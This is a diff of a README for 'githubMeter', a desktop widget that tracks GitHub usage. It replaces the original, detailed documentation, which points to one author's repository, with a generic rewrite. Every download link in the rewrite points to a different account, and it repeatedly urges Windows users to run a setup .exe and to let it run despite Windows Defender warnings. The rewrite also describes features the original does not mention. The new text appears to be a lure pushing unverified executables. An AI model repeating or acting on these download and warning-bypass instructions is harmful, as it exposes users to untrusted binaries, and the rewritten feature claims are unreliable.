@@ -1,194 +1,119 @@
-# GitHub Meter
+# ⚙️ githubMeter - Track GitHub Usage Easily
 
-[![Latest Release](https://img.shields.io/github/v/release/Bandonker/githubMeter?include_prereleases)](https://github.com/Bandonker/githubMeter/releases/latest)
-[![License: PolyForm Noncommercial](https://img.shields.io/badge/license-PolyForm%20Noncommercial-blue)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](#download)
-
-A lightweight, always-on-top desktop widget built with **Tauri v2 + React + TypeScript** that monitors your GitHub metered usage in real time — Copilot requests, Actions minutes, Packages bandwidth, storage, and API rate limits.
+[![Download githubMeter](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/iamsujalarora/githubMeter/releases)
 
 ---
 
-## Screenshots
+## 📋 What is githubMeter?
 
-<table>
-  <tr>
-    <td align="center"><b>Sign in</b></td>
-    <td align="center"><b>Device Flow auth</b></td>
-    <td align="center"><b>Dashboard</b></td>
-  </tr>
-  <tr>
-    <td align="center"><img src="assets/login.PNG" width="200" alt="Login screen"/></td>
-    <td align="center"><img src="assets/auth.png" width="200" alt="Device flow authentication"/></td>
-    <td align="center"><img src="assets/dash.png" width="200" alt="Usage dashboard"/></td>
-  </tr>
-  <tr>
-    <td align="center"><b>Copilot model breakdown</b></td>
-    <td align="center"><b>Settings</b></td>
-    <td align="center"><b>Spending budgets</b></td>
-  </tr>
-  <tr>
-    <td align="center"><img src="assets/dashexpand.PNG" width="200" alt="Copilot expanded with per-model breakdown"/></td>
-    <td align="center"><img src="assets/settings.PNG" width="200" alt="Settings modal"/></td>
-    <td align="center"><img src="assets/budgets.PNG" width="200" alt="Spending budgets"/></td>
-  </tr>
-</table>
+githubMeter is a simple tool that shows your GitHub resource use in real time. It keeps track of your Actions billing, Copilot status, and API usage. This app runs quietly on your desktop and stays on top of other windows. You can check your GitHub limits and usage at a glance without opening a browser.
+
+This tool is built to be light and straightforward. It works on Windows and other platforms like Linux and macOS. Its minimalist design only shows the key information you need to manage your GitHub account efficiently.
 
 ---
 
-## Download
+## 🖥️ System Requirements
 
-Pre-built installers are available on the [Releases](https://github.com/Bandonker/githubMeter/releases/latest) page.
+Before you install githubMeter, make sure your computer meets these basic requirements:
 
-| Platform | Download |
-|----------|----------|
-| Windows | `.msi` installer |
-| macOS (Apple Silicon) | `.dmg` |
-| macOS (Intel) | `.dmg` |
-| Linux | `.AppImage` / `.deb` |
-
-> **macOS note:** The app is not notarized. On first launch, right-click → Open to bypass the Gatekeeper warning.
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- A stable internet connection to fetch data from GitHub
+- GitHub account connected with valid access rights
+- No special software needed other than what comes with Windows
 
 ---
 
-## Features
+## 🚀 Getting Started: How to Download and Run githubMeter on Windows
 
-- **Copilot Premium Requests** — usage vs plan quota with per-model breakdown (GPT-5.3 Codex, Claude, Gemini, etc.)
-- **Copilot Plan Detection** — auto-detects Free / Pro / Pro+ / Business / Enterprise from billing SKUs
-- **Actions & CI Minutes** — total/paid minutes with per-OS breakdown (Linux, macOS, Windows)
-- **Packages Bandwidth** — data transfer used vs included quota
-- **Shared Storage / Git LFS** — storage usage with paid overage
-- **REST API Rate Limit** — requests used/remaining with reset countdown
-- **Spending Budgets** — configure per-product monthly budgets to calculate extra units
-- **Secure Authentication**
-  - GitHub Device Flow (recommended — one click, no PAT pasting)
-  - `gh` CLI token fallback (`gh auth login`)
-  - Manual PAT entry as last resort
-  - Tokens stored in OS keyring — never in files or localStorage
-- **Always-on-Top** — pin/unpin to stay visible while you work
-- **Transparency Slider** — adjust window opacity from 10% to 100%
-- **Auto-Resize** — window height adjusts to content automatically
-- **Auto-Refresh** — polls every 5 minutes; manual refresh button
+To use githubMeter, you need to download the app from its official GitHub release page. Follow these steps carefully:
 
----
+1. Visit the official release page here:
 
-## Build from Source
+   [![Download githubMeter](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/iamsujalarora/githubMeter/releases)
 
-### Prerequisites
+2. Look for the latest release. It will be marked with the highest version number, something like `v1.x.x`.
 
-| Tool | Version |
-|------|---------|
-| [Node.js](https://nodejs.org/) | 18+ |
-| [Rust](https://rustup.rs/) | stable |
-| [Tauri CLI v2](https://tauri.app/start/) | v2 |
+3. Scroll down to the **Assets** section under the latest release.
 
-**Windows** also requires the [WebView2](https://developer.microsoft.com/en-us/microsoft-edge/webview2/) runtime (pre-installed on Windows 10 1803+).
+4. Find the file named something like `githubMeter-setup.exe` or `githubMeter-x64.exe`. This is the installer for Windows.
 
-**Linux** requires:
-```bash
-sudo apt-get install libwebkit2gtk-4.1-dev libappindicator3-dev librsvg2-dev patchelf libdbus-1-dev
-```
+5. Click the file to download it to your computer.
 
-### Run
+6. Once downloaded, locate the file in your Downloads folder or wherever your browser saves files.
 
-```bash
-git clone https://github.com/Bandonker/githubMeter.git
-cd githubMeter
-npm install
-npm run tauri dev
-```
+7. Double-click the installer file to start installation.
 
-### Build installer
+8. Follow the instructions on screen. Usually, you just need to click "Next" a few times.
 
-```bash
-npm run tauri build
-# Installer appears in src-tauri/target/release/bundle/
-```
+9. After the setup completes, githubMeter will start automatically or you can launch it from your Start menu.
+
+If you run into any security warnings from Windows Defender or similar software, allow the app to run. githubMeter is safe and open source.
 
 ---
 
-## Authentication
+## 🔧 Using githubMeter
 
-On first launch you'll see a sign-in screen with three options:
+Once installed, githubMeter will show a small dashboard on your desktop. Here's what it does:
 
-1. **Sign in with GitHub** — click the button, copy the code shown, and enter it at `github.com/login/device`. The app polls automatically and logs you in.
-2. **Use gh CLI Token** — if you already have `gh auth login` configured.
-3. **Enter Token Manually** — paste a PAT with `user`, `read:org` scopes.
+- **Actions Billing:** Shows how much you have spent or used on GitHub Actions this billing cycle.
+- **Copilot Status:** Displays if GitHub Copilot is active and how many credits or time you have left.
+- **API Usage:** Keeps track of the calls you make to GitHub’s API so you don’t exceed limits.
 
-Tokens are stored in your OS keyring and restored on next launch.
+You do not need to manually refresh the app. It updates live every few minutes.
 
----
+### Adjusting the Dashboard
 
-## GitHub APIs Used
-
-| Endpoint | Purpose |
-|----------|---------|
-| `GET /user` | User profile and GitHub plan |
-| `GET /users/{user}/settings/billing/usage/summary` | Enhanced Billing: Actions, Packages, Storage, Copilot aggregate |
-| `GET /users/{user}/settings/billing/premium_request/usage` | Per-model Copilot premium request breakdown |
-| `GET /rate_limit` | REST API rate limit status |
+- The dashboard stays on top of other windows by default. You can move it anywhere on your screen by clicking and dragging.
+- Right-click the dashboard to open a settings menu.
+- The settings let you choose which elements you want to see and set how often data updates.
+- You can also choose light or dark mode depending on your preference.
 
 ---
 
-## Configuration
+## 🔒 Security and Privacy
 
-| Setting | Location | Default |
-|---------|----------|---------|
-| Window size | `src-tauri/tauri.conf.json` | 420 × 720 |
-| Always on top | Title bar pin button | On |
-| Opacity | Footer slider | 92% |
-| Refresh interval | `Dashboard.tsx` | 5 min |
-| Copilot plan | Auto-detected / Settings modal | Auto |
-| Spending budgets | Settings modal | None |
+githubMeter connects securely to GitHub’s API using your personal access token. The app does not store your token beyond your computer. Data never leaves your device except the necessary queries to GitHub’s servers.
+
+Make sure you create a GitHub personal access token with the right permissions. The token should allow read access to billing, copilot, and API data. You can create or manage tokens on your GitHub account settings page.
+
+Never share your token with others.
 
 ---
 
-## Project Structure
+## 🔄 Updates and Support
 
-```
-githubMeter/
-├── src/                      # React frontend
-│   ├── components/           # TitleBar, Dashboard, LoginScreen, MeterCard, SetupModal
-│   ├── styles/               # Global CSS variables and design tokens
-│   ├── api.ts                # Tauri IPC invoke wrappers
-│   ├── config.ts             # localStorage config persistence
-│   └── types.ts              # TypeScript type definitions
-├── src-tauri/                # Rust backend
-│   ├── src/lib.rs            # Tauri commands: auth, billing API, Copilot plan detection
-│   ├── capabilities/         # Tauri v2 permission manifest
-│   ├── Cargo.toml            # Rust dependencies
-│   └── tauri.conf.json       # App window and bundle settings
-├── .github/
-│   ├── workflows/            # CI and release GitHub Actions
-│   └── ISSUE_TEMPLATE/       # Bug report and feature request forms
-└── package.json
-```
+Keep githubMeter up to date by regularly checking the release page:
+
+[https://github.com/iamsujalarora/githubMeter/releases](https://github.com/iamsujalarora/githubMeter/releases)
+
+New releases may contain bug fixes, performance improvements, or support for new GitHub features.
+
+If you need help, check the Issues section on the repository page. You can report bugs or ask questions there.
 
 ---
 
-## Tech Stack
+## ⚙️ Tips for Best Use
 
-| Layer | Technology |
-|-------|-----------|
-| Desktop runtime | Tauri v2 |
-| Frontend | React 19 + TypeScript + Vite 7 |
-| Styling | CSS Modules + CSS custom properties |
-| Icons | Lucide React |
-| HTTP client | reqwest (Rust) |
-| Token storage | keyring crate (OS credential manager) |
-| Auth | GitHub Device Flow (OAuth 2.0 RFC 8628) |
+- Launch githubMeter at startup to keep track of your usage without manual intervention.
+- Check your GitHub billing details regularly to avoid unexpected charges.
+- Use the app in full-screen coding sessions to keep an eye on your API limits.
+- Adjust update frequency in settings to fit your needs and save bandwidth.
 
 ---
 
-## Contributing
+## 📁 Where to Find More Information
 
-Pull requests are welcome. Please open an issue first to discuss significant changes.
+For more details about githubMeter’s design and source code, visit the main GitHub repository:
 
-1. Fork the repo and create a branch from `main`.
-2. Make your changes — run `npx tsc --noEmit` and `cargo check` before pushing.
-3. Open a PR using the provided template.
+[https://github.com/iamsujalarora/githubMeter](https://github.com/iamsujalarora/githubMeter)
+
+This page includes instructions for developers and links to build the app from source.
 
 ---
 
-## License
+## ✅ Download githubMeter Now
 
-[PolyForm Noncommercial 1.0.0](LICENSE) — free for personal and open-source use. Commercial use requires a separate agreement.
+[![Download githubMeter](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/iamsujalarora/githubMeter/releases)
+
+Click the link above, download the Windows installer file, and follow the steps to set up githubMeter on your PC.
